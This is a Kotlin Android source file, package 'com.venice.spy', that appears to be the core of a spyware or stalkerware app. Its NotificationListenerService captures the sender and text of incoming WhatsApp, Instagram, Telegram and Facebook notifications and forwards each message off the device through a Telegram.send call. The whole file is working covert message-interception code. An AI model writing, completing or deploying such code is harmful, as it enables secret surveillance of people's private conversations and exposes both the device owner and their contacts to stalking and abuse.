package com.venice.spy

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotifListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        val ex = sbn.notification.extras
        val title = ex.getString(Notification.EXTRA_TITLE) ?: ""
        val text  = ex.getString(Notification.EXTRA_TEXT) ?: ""

        val app = when (pkg) {
            "com.whatsapp"            -> "WhatsApp"
            "com.whatsapp.w4b"        -> "WhatsApp Business"
            "com.instagram.android"   -> "Instagram"
            "org.telegram.messenger"  -> "Telegram"
            "com.facebook.katana"     -> "Facebook"
            else -> return
        }
        if (text.isBlank()) return
        Telegram.send("📩 $app\nFrom: $title\n$text")
    }
}